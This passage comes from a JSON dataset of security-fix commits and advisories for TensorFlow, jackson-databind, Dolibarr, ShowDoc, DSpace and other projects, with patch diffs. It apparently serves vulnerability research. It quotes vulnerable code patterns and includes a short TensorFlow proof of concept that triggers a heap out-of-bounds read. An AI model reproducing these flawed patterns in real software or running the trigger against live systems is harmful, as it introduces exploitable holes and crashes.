'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fused_batch_norm_op.cc'])","num_files":1.0},{"index":1452,"vuln_id":"GHSA-c265-37vj-cwcc","cwe_id":"{'CWE-502'}","score":8.1,"chain":"{'https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/99001cdb6807b5c7b170ec6a9092ecbb618ae79c'}","dataset":"osv","summary":"Deserialization of untrusted data in Jackson Databind FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool (aka xalan2).","published_date":"2020-06-18","chain_len":1,"project":"https:\/\/github.com\/FasterXML\/jackson-databind","commit_href":"https:\/\/github.com\/FasterXML\/jackson-databind\/commit\/99001cdb6807b5c7b170ec6a9092ecbb618ae79c","commit_sha":"99001cdb6807b5c7b170ec6a9092ecbb618ae79c","patch":"SINGLE","chain_ord":"['99001cdb6807b5c7b170ec6a9092ecbb618ae79c']","before_first_fix_commit":"{'716f3f95fb82c686cc20d7255665de54c5330fa7'}","last_fix_commit":"99001cdb6807b5c7b170ec6a9092ecbb618ae79c","chain_ord_pos":1.0,"commit_datetime":"05\/02\/2020, 02:17:39","message":"Fix #2704","author":"Tatu Saloranta","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'release-notes\/VERSION-2.x': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FasterXML\/jackson-databind\/raw\/99001cdb6807b5c7b170ec6a9092ecbb618ae79c\/release-notes%2FVERSION-2.x', 'patch': '@@ -10,6 +10,8 @@ Project: jackson-databind\\n  (reported by Topsec(tcc))\\n #2698: Block one more gadget type (weblogic\/oracle-aqjms)\\n  (reported by Fangrun Li)\\n+#2704: Block one more gadget type (weblogic\/oracle-aqjms)\\n+ (reported by XuYuanzhen)\\n \\n 2.9.10.4 (11-Apr-2020)'}}","message_norm":"fix #2704","language":"ca","entities":"[('fix', 'ACTION', ''), ('#2704', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['release-notes\/VERSION-2.x'])","num_files":1.0},{"index":1463,"vuln_id":"GHSA-c32w-3cqh-f6jx","cwe_id":"{'CWE-640'}","score":8.8,"chain":"{'https:\/\/github.com\/Dolibarr\/dolibarr\/commit\/87f9530272925f0d651f59337a35661faeb6f377'}","dataset":"osv","summary":"Weak Password Recovery Mechanism for Forgotten Password In \u201cDolibarr\u201d application, v2.8.1 to v13.0.2 are vulnerable to account takeover via password reset functionality. A low privileged attacker can reset the password of any user in the application using the password reset link the user received through email when requested for a forgotten password.","published_date":"2021-09-02","chain_len":1,"project":"https:\/\/github.com\/Dolibarr\/dolibarr","commit_href":"https:\/\/github.com\/Dolibarr\/dolibarr\/commit\/87f9530272925f0d651f59337a35661faeb6f377","commit_sha":"87f9530272925f0d651f59337a35661faeb6f377","patch":"SINGLE","chain_ord":"['87f9530272925f0d651f59337a35661faeb6f377']","before_first_fix_commit":"{'8b07e99e05a9ed3c57bdc00c6a469fbbaa5672ef'}","last_fix_commit":"87f9530272925f0d651f59337a35661faeb6f377","chain_ord_pos":1.0,"commit_datetime":"07\/05\/2021, 15:29:10","message":"Fix report by Ahsan Aziz (can reset the password of another user that\ndid not request password reset).","author":"Laurent Destailleur","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'htdocs\/user\/passwordforgotten.php': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Dolibarr\/dolibarr\/raw\/87f9530272925f0d651f59337a35661faeb6f377\/htdocs%2Fuser%2Fpasswordforgotten.php', 'patch': '@@ -87,14 +87,14 @@\\n \\t\/\/ Validate new password\\n \\tif ($action == \\'validatenewpassword\\' && $username && $passworduidhash) {\\n \\t\\t$edituser = new User($db);\\n-\\t\\t$result = $edituser->fetch(\\'\\', $_GET[\"username\"]);\\n+\\t\\t$result = $edituser->fetch(\\'\\', $username);\\n \\t\\tif ($result < 0) {\\n \\t\\t\\t$message = \\'<div class=\"error\">\\'.dol_escape_htmltag($langs->trans(\"ErrorLoginDoesNotExists\", $username)).\\'<\/div>\\';\\n \\t\\t} else {\\n \\t\\t\\tglobal $dolibarr_main_instance_unique_id;\\n \\n \\t\\t\\t\/\/print $edituser->pass_temp.\\'-\\'.$edituser->id.\\'-\\'.$dolibarr_main_instance_unique_id.\\' \\'.$passworduidhash;\\n-\\t\\t\\tif (dol_verifyHash($edituser->pass_temp.\\'-\\'.$edituser->id.\\'-\\'.$dolibarr_main_instance_unique_id, $passworduidhash)) {\\n+\\t\\t\\tif ($edituser->pass_temp && dol_verifyHash($edituser->pass_temp.\\'-\\'.$edituser->id.\\'-\\'.$dolibarr_main_instance_unique_id, $passworduidhash)) {\\n \\t\\t\\t\\t\/\/ Clear session\\n \\t\\t\\t\\tunset($_SESSION[\\'dol_login\\']);\\n \\t\\t\\t\\t$_SESSION[\\'dol_loginmesg\\'] = $langs->trans(\\'NewPasswordValidated\\'); \/\/ Save message for the session page'}}","message_norm":"fix report by ahsan aziz (can reset the password of another user that\ndid not request password reset).","language":"en","entities":"[('fix', 'ACTION', ''), ('password', 'SECWORD', ''), ('password', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['htdocs\/user\/passwordforgotten.php'])","num_files":1.0},{"index":1465,"vuln_id":"GHSA-c383-q5vf-hx55","cwe_id":"{'CWE-190'}","score":7.5,"chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583'}","dataset":"osv","summary":"Integer Overflow or Wraparound in Microweber Microweber prior to 1.2.12 is vulnerable to Integer Overflow or Wraparound.","published_date":"2022-03-12","chain_len":1,"project":"https:\/\/github.com\/microweber\/microweber","commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583","commit_sha":"7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583","patch":"SINGLE","chain_ord":"['7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583']","before_first_fix_commit":"{'28f2677ea228a36e7692505e1821ae373a8b07e4'}","last_fix_commit":"7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583","chain_ord_pos":1.0,"commit_datetime":"03\/11\/2022, 08:30:42","message":"checkout shipping address validation - max chars allowed","author":"Bozhidar Slaveykov","comments":null,"stats":"{'additions': 21, 'deletions': 4, 'total': 25}","files":"{'src\/MicroweberPackages\/Checkout\/Http\/Controllers\/Traits\/ShippingTrait.php': {'additions': 21, 'deletions': 4, 'changes': 25, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/7559e141d0707f8eeff2f9aeaa5a0ca2e3fe6583\/src%2FMicroweberPackages%2FCheckout%2FHttp%2FControllers%2FTraits%2FShippingTrait.php', 'patch': \"@@ -38,13 +38,30 @@ public function shippingMethodSave(Request $request) {\\n \\n         if (is_array($request->get('Address'))) {\\n             $request->merge([\\n-               'city'=>$request->get('Address')['city'],\\n-               'zip'=>$request->get('Address')['zip'],\\n-               'state'=>$request->get('Address')['state'],\\n-               'address'=>$request->get('Address')['address'],\\n+                'city'=>$request->get('Address')['city'],\\n+                'zip'=>$request->get('Address')['zip'],\\n+                'state'=>$request->get('Address')['state'],\\n+                'address'=>$request->get('Address')['address'],\\n             ]);\\n         }\\n \\n+        $rules = [];\\n+        $rules['shipping_gw'] = 'max:500';\\n+        $rules['city'] = 'max:500';\\n+        $rules['address'] = 'max:500';\\n+        $rules['country'] = 'max:500';\\n+        $rules['state'] = 'max:500';\\n+        $rules['zip'] = 'max:500';\\n+        $rules['other_info'] = 'max:500';\\n+\\n+        $validator = Validator::make($request->all(), $rules);\\n+\\n+        if ($validator->fails()) {\\n+            $errors = $validator->messages()->toArray();\\n+            session_set('errors', $errors);\\n+            return redirect(route('checkout.shipping_method'));\\n+        }\\n+\\n         session_append_array('checkout_v2', [\\n             'shipping_gw'=> $request->get('shipping_gw'),\\n             'city'=> $request->get('city'),\"}}","message_norm":"checkout shipping address validation - max chars allowed","language":"en","entities":null,"classification_level_1":"NON_SECURITY_RELATED","classification_level_2":"REDUNDANT_MESSAGE","list_files":"dict_keys(['src\/MicroweberPackages\/Checkout\/Http\/Controllers\/Traits\/ShippingTrait.php'])","num_files":1.0},{"index":1468,"vuln_id":"GHSA-c3g4-w6cv-6v7h","cwe_id":"{'CWE-276'}","score":6.8,"chain":"{'https:\/\/github.com\/containers\/buildah\/commit\/e7e55c988c05dd74005184ceb64f097a0cfe645b', 'https:\/\/github.com\/containers\/buildah\/commit\/90b3254c7404039c1c786999ac189654228f6e0e'}","dataset":"osv","summary":"Non-empty default inheritable capabilities for linux container in Buildah A bug was found in Buildah where containers were created with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during execve(2).\n\nThis bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.","published_date":"2022-04-01","chain_len":2,"project":"https:\/\/github.com\/containers\/buildah","commit_href":"https:\/\/github.com\/containers\/buildah\/commit\/90b3254c7404039c1c786999ac189654228f6e0e","commit_sha":"90b3254c7404039c1c786999ac189654228f6e0e","patch":"MULTI","chain_ord":"['e7e55c988c05dd74005184ceb64f097a0cfe645b', '90b3254c7404039c1c786999ac189654228f6e0e']","before_first_fix_commit":"{'5d252d404df19f77d26d6af956f4809103ce079f'}","last_fix_commit":"90b3254c7404039c1c786999ac189654228f6e0e","chain_ord_pos":2.0,"commit_datetime":"03\/24\/2022, 20:32:47","message":"Add a test for CVE-2022-27651\n\nCheck that the inheritable capabilities are set to 0, even when we\nexplicitly try to add capabilities.\n\nSigned-off-by: Nalin Dahyabhai <nalin@redhat.com>","author":"Nalin Dahyabhai","comments":null,"stats":"{'additions': 14, 'deletions': 0, 'total': 14}","files":"{'tests\/run.bats': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/containers\/buildah\/raw\/90b3254c7404039c1c786999ac189654228f6e0e\/tests%2Frun.bats', 'patch': '@@ -786,9 +786,23 @@ _EOF\\n \\tif test \"$DBUS_SESSION_BUS_ADDRESS\" = \"\"; then\\n \\t\\tskip \"${1:-test does not work when \\\\$BUILDAH_ISOLATION = chroot}\"\\n \\tfi\\n+\\t_prefetch alpine\\n \\n \\trun_buildah from --quiet --pull=false --signature-policy ${TESTSDIR}\/policy.json alpine\\n \\tcid=$output\\n \\trun_buildah run --cgroupns=host $cid cat \/proc\/self\/cgroup\\n \\texpect_output --substring \"\/user.slice\/\"\\n }\\n+\\n+@test \"run-inheritable-capabilities\" {\\n+\\tskip_if_no_runtime\\n+\\n+\\t_prefetch alpine\\n+\\n+\\trun_buildah from --quiet --pull=false --signature-policy ${TESTSDIR}\/policy.json alpine\\n+\\tcid=$output\\n+\\trun_buildah run $cid grep ^CapInh: \/proc\/self\/status\\n+\\texpect_output \"CapInh:\\t0000000000000000\"\\n+\\trun_buildah run --cap-add=ALL $cid grep ^CapInh: \/proc\/self\/status\\n+\\texpect_output \"CapInh:\\t0000000000000000\"\\n+}'}}","message_norm":"add a test for cve-2022-27651\n\ncheck that the inheritable capabilities are set to 0, even when we\nexplicitly try to add capabilities.\n\nsigned-off-by: nalin dahyabhai <nalin@redhat.com>","language":"en","entities":"[('add', 'ACTION', ''), ('cve-2022-27651', 'VULNID', 'CVE'), ('add', 'ACTION', ''), ('nalin@redhat.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tests\/run.bats'])","num_files":1.0},{"index":1472,"vuln_id":"GHSA-c442-3278-rhrg","cwe_id":"{'CWE-434'}","score":9.8,"chain":"{'https:\/\/github.com\/star7th\/showdoc\/commit\/49b992d4c548c8c615a92b6efe8a50c8f1083abf'}","dataset":"osv","summary":"Unrestricted File Upload in ShowDoc v2.9.5 Unrestricted File Upload in ShowDoc v2.9.5 allows remote attackers to execute arbitrary code via the 'file_url' parameter in the component AdminUpdateController.class.php'.","published_date":"2021-09-09","chain_len":1,"project":"https:\/\/github.com\/star7th\/showdoc","commit_href":"https:\/\/github.com\/star7th\/showdoc\/commit\/49b992d4c548c8c615a92b6efe8a50c8f1083abf","commit_sha":"49b992d4c548c8c615a92b6efe8a50c8f1083abf","patch":"SINGLE","chain_ord":"['49b992d4c548c8c615a92b6efe8a50c8f1083abf']","before_first_fix_commit":"{'8db2d13196df7067fdf2e37cf1e5e2d7aba3d748'}","last_fix_commit":"49b992d4c548c8c615a92b6efe8a50c8f1083abf","chain_ord_pos":1.0,"commit_datetime":"06\/24\/2021, 15:25:43","message":"Fix security vulnerabilities","author":"star7th","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'server\/Application\/Api\/Controller\/AdminUpdateController.class.php': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/star7th\/showdoc\/raw\/49b992d4c548c8c615a92b6efe8a50c8f1083abf\/server%2FApplication%2FApi%2FController%2FAdminUpdateController.class.php', 'patch': '@@ -24,6 +24,8 @@ public function checkUpdate(){\\n \\n     \/\/ \u4e0b\u8f7d\u66f4\u65b0\u4ee3\u7801\u5305\\n     public function download(){\\n+        $this->checkLogin();\\n+        $this->checkAdmin();\\n         set_time_limit(1000);\\n         ini_set(\\'memory_limit\\',\\'500M\\');\\n         $new_version = I(\"new_version\") ;\\n@@ -78,6 +80,8 @@ public function download(){\\n \\n     \/\/ \u6267\u884c\u5347\u7ea7\u64cd\u4f5c\uff0c\u5347\u7ea7\u8986\u76d6\u6587\u4ef6\\n     public function updateFiles(){\\n+        $this->checkLogin();\\n+        $this->checkAdmin();\\n         set_time_limit(1000);\\n         ini_set(\\'memory_limit\\',\\'500M\\');'}}","message_norm":"fix security vulnerabilities","language":"ro","entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', ''), ('vulnerabilities', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server\/Application\/Api\/Controller\/AdminUpdateController.class.php'])","num_files":1.0},{"index":1473,"vuln_id":"GHSA-c45w-2wxr-pp53","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5899741d0421391ca878da47907b1452f06aaf1b'}","dataset":"osv","summary":"Heap OOB read in `tf.raw_ops.Dequantize` ### Impact\nDue to lack of validation in `tf.raw_ops.Dequantize`, an attacker can trigger a read from outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\ninput_tensor=tf.constant(\n  [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\\\n  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)\ninput_tensor=tf.cast(input_tensor, dtype=tf.quint8)\nmin_range = tf.constant([-10], shape=[1], dtype=tf.float32)\nmax_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)\n  \ntf.raw_ops.Dequantize( \n  input=input_tensor, min_range=min_range, max_range=max_range, mode='SCALED',\n  narrow_range=True, axis=0, dtype=tf.dtypes.float32)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/26003593aa94b1742f34dc22ce88a1e17776a67d\/tensorflow\/core\/kernels\/dequantize_op.cc#L106-L131) accesses the `min_range` and `max_range` tensors in parallel but fails to check that they have the same shape:\n\n```cc\nif (num_slices == 1) {\n  const float min_range = input_min_tensor.flat<float>()(0);\n  const float max_range = input_max_tensor.flat<float>()(0);\n  DequantizeTensor(ctx, input, min_range, max_range, &float_output);\n} else {\n  ...\n  auto min_ranges = input_min_tensor.vec<float>();\n  auto max_ranges = input_max_tensor.vec<float>();\n  for (int i = 0; i < num_slices; ++i) {\n    DequantizeSlice(ctx->eigen_device<Device>(), ctx,\n                    input_tensor.template chip<1>(i), min_ranges(i),\n                    max_ranges(i), output_tensor.template chip<1>(i));\n    ...\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [5899741d0421391ca878da47907b1452f06aaf1b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5899741d0421391ca878da47907b1452f06aaf1b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/5899741d0421391ca878da47907b1452f06aaf1b","commit_sha":"5899741d0421391ca878da47907b1452f06aaf1b","patch":"SINGLE","chain_ord":"['5899741d0421391ca878da47907b1452f06aaf1b']","before_first_fix_commit":"{'26003593aa94b1742f34dc22ce88a1e17776a67d'}","last_fix_commit":"5899741d0421391ca878da47907b1452f06aaf1b","chain_ord_pos":1.0,"commit_datetime":"05\/06\/2021, 22:31:05","message":"Fix heap OOB read in dequantize op.\n\nAlso fixes SEGV in same op\n\nPiperOrigin-RevId: 372437896\nChange-Id: I135e94d360c2a1ce374c10f7e0fed1af603dbc02","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'tensorflow\/core\/kernels\/dequantize_op.cc': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/5899741d0421391ca878da47907b1452f06aaf1b\/tensorflow%2Fcore%2Fkernels%2Fdequantize_op.cc', 'patch': '@@ -98,6 +98,18 @@ class DequantizeOp : public OpKernel {\\n     if (axis_ > -1) {\\n       num_slices = input.dim_size(axis_);\\n     }\\n+    OP_REQUIRES(ctx, input_min_tensor.NumElements() == num_slices,\\n+                errors::InvalidArgument(\\n+                    \"input_min_tensor must have as many elements as input on \"\\n+                    \"the dequantization axis (\",\\n+                    axis_, \"), got \", input_min_tensor.NumElements(),\\n+                    \", expected \", num_slices));\\n+    OP_REQUIRES(ctx, input_max_tensor.NumElements() == num_slices,\\n+                errors::InvalidArgument(\\n+                    \"input_max_tensor must have as many elements as input on \"\\n+                    \"the dequantization axis (\",\\n+                    axis_, \"), got \", input_max_tensor.NumElements(),\\n+                    \", expected \", num_slices));\\n \\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(0, input.shape(), &output));'}}","message_norm":"fix heap oob read in dequantize op.\n\nalso fixes segv in same op\n\npiperorigin-revid: 372437896\nchange-id: i135e94d360c2a1ce374c10f7e0fed1af603dbc02","language":"en","entities":"[('fix', 'ACTION', ''), ('heap oob', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('372437896', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/dequantize_op.cc'])","num_files":1.0},{"index":1482,"vuln_id":"GHSA-c53x-wwx2-pg96","cwe_id":"{'CWE-79'}","score":6.5,"chain":"{'https:\/\/github.com\/bersLucas\/liljs\/commit\/779c0dcd8aba434a1c94db7d1d2d990a629f9a6c'}","dataset":"osv","summary":"Cross-Site Scripting in @berslucas\/liljs Versions of  `@berslucas\/liljs` prior to 1.0.2 are vulnerable to Cross-Site Scripting (XSS). The package uses the unsafe `innerHTML` function without sanitizing input, which may allow attackers to execute arbitrary JavaScript on the victim's browser.\n\n\n## Recommendation\n\nUpgrade to version 1.0.2 or later.","published_date":"2020-09-03","chain_len":1,"project":"https:\/\/github.com\/bersLucas\/liljs","commit_href":"https:\/\/github.com\/bersLucas\/liljs\/commit\/779c0dcd8aba434a1c94db7d1d2d990a629f9a6c","commit_sha":"779c0dcd8aba434a1c94db7d1d2d990a629f9a6c","patch":"SINGLE","chain_ord":"['779c0dcd8aba434a1c94db7d1d2d990a629f9a6c']","before_first_fix_commit":"{'bc0919e0031e6e6aa99be9793a6a9afa8ad2e5b1'}","last_fix_commit":"779c0dcd8aba434a1c94db7d1d2d990a629f9a6c","chain_ord_pos":1.0,"commit_datetime":"02\/10\/2019, 03:29:54","message":"Use textContent over innerHTML so you can bind untrusted text values\nwithout the possibility of an XSS attack.","author":"Cody Mikol","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/liljs.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/bersLucas\/liljs\/raw\/779c0dcd8aba434a1c94db7d1d2d990a629f9a6c\/src%2Fliljs.js', 'patch': '@@ -21,7 +21,7 @@ const liljs = (elem, data = {}) => {\\n      * @param {String} property Name of the property to render\\n      * @param {String} value (Optional) A value to use instead of a property (used in lil-list-text)\\n      *\/\\n-    const setText = (elem, property, value) => elem.innerHTML = value || state[property].value;\\n+    const setText = (elem, property, value) => elem.textContent = value || state[property].value;\\n \\n     \/** Set style helper function\\n      * @function setStyle\\n@@ -43,7 +43,7 @@ const liljs = (elem, data = {}) => {\\n      *\/\\n     const setList = (elem, property) => {\\n       \/\/TODO: Find a way to update without clearing lists\\n-      elem.innerHTML = \"\";\\n+      elem.textContent = \"\";\\n       state[property].value.forEach(value => {\\n         let clone = document.importNode(state[property].template.content, true);\\n         clone.querySelectorAll(\"[lil-list-text]\").forEach(node => {'}}","message_norm":"use textcontent over innerhtml so you can bind untrusted text values\nwithout the possibility of an xss attack.","language":"en","entities":"[('untrusted', 'SECWORD', ''), ('xss', 'SECWORD', ''), ('attack', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/liljs.js'])","num_files":1.0},{"index":1483,"vuln_id":"GHSA-c545-c4f9-rf6v","cwe_id":"{'CWE-125'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d94ffe08a65400f898241c0374e9edc6fa8ed257'}","dataset":"osv","summary":"Heap OOB in TFLite ### Impact\nTFLite's [`expand_dims.cc`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/149562d49faa709ea80df1d99fc41d005b81082a\/tensorflow\/lite\/kernels\/expand_dims.cc#L36-L50) contains a vulnerability which allows reading one element outside of bounds of heap allocated data:\n\n```cc\n  if (axis < 0) { \n    axis = input_dims.size + 1 + axis;\n  }   \n  TF_LITE_ENSURE(context, axis <= input_dims.size);\n\n  TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\n  for (int i = 0; i < output_dims->size; ++i) {\n    if (i < axis) {\n      output_dims->data[i] = input_dims.data[i];\n    } else if (i == axis) {\n      output_dims->data[i] = 1;\n    } else {\n      output_dims->data[i] = input_dims.data[i - 1];\n    }\n  }\n```\n\nIf `axis` is a large negative value (e.g., `-100000`), then after the first `if` it would still be negative. The check following the `if` statement will pass and the `for` loop would read one element before the start of `input_dims.data` (when `i = 0`).\n\n### Patches\nWe have patched the issue in GitHub commit [d94ffe08a65400f898241c0374e9edc6fa8ed257](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d94ffe08a65400f898241c0374e9edc6fa8ed257).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/d94ffe08a65400f898241c0374e9edc6fa8ed257","commit_sha":"d94ffe08a65400f898241c0374e9edc6fa8ed257","patch":"SINGLE","chain_ord":"['d94ffe08a65400f898241c0374e9edc6fa8ed257']","before_first_fix_commit":"{'e95fc647063378993ec84d41cbbda6dcb60bad4e'}","last_fix_commit":"d94ffe08a65400f898241c0374e9edc6fa8ed257","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 21:42:54","message":"Prevent an OOB read in `expand_dims.cc`\n\nThe for loop that follows this check assumes that `axis` is between `0` and `input_dims.size`. If user supplied `axis` is negative, the if code before this check is supposed to bring it back to positive (similar to how in Python one can do `l[-3]` to mean `l[-3 + len(l)]`).\n\nPiperOrigin-RevId: 387200206\nChange-Id: I162f4feba12d547c3a4340833ae682016a2ebfab","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'tensorflow\/lite\/kernels\/expand_dims.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/d94ffe08a65400f898241c0374e9edc6fa8ed257\/tensorflow%2Flite%2Fkernels%2Fexpand_dims.cc', 'patch': '@@ -37,6 +37,7 @@ TfLiteStatus ExpandTensorDim(TfLiteContext* context, const TfLiteTensor& input,\\n     axis = input_dims.size + 1 + axis;\\n   }\\n   TF_LITE_ENSURE(context, axis <= input_dims.size);\\n+  TF_LITE_ENSURE(context, axis >= 0);\\n \\n   TfLiteIntArray* output_dims = TfLiteIntArrayCreate(input_dims.size + 1);\\n   for (int i = 0; i < output_dims->size; ++i) {'}}","message_norm":"prevent an oob read in `expand_dims.cc`\n\nthe for loop that follows this check assumes that `axis` is between `0` and `input_dims.size`. if user supplied `axis` is negative, the if code before this check is supposed to bring it back to positive (similar to how in python one can do `l[-3]` to mean `l[-3 + len(l)]`).\n\npiperorigin-revid: 387200206\nchange-id: i162f4feba12d547c3a4340833ae682016a2ebfab","language":"en","entities":"[('prevent', 'ACTION', ''), ('oob', 'SECWORD', ''), ('387200206', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/expand_dims.cc'])","num_files":1.0},{"index":1484,"vuln_id":"GHSA-c558-5gfm-p2r8","cwe_id":"{'CWE-79'}","score":7.1,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a'}","dataset":"osv","summary":"JSPUI spellcheck and autocomplete tools vulnerable to Cross Site Scripting ### Impact\nThe JSPUI spellcheck \"Did you mean\" HTML escapes the data-spell attribute in the link, but not the actual displayed text.  Similarly, the JSPUI autocomplete HTML does not properly escape text passed to it. Both are vulnerable to XSS.  This vulnerability only impacts the JSPUI.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n_DSpace 6.x:_\n* Fixed in 6.4 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7\n* 6.x patch files available (may be applied manually if an immediate upgrade to 6.4 or above is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7.patch\n\n_DSpace 5.x:_\n* Fixed in 5.11 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5\n* 5.x patch files available (may be applied manually if an immediate upgrade to 5.11 or 6.4 is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5.patch\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### References\nDiscovered & reported by Hassan Bhuiyan (Brunel University London)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at 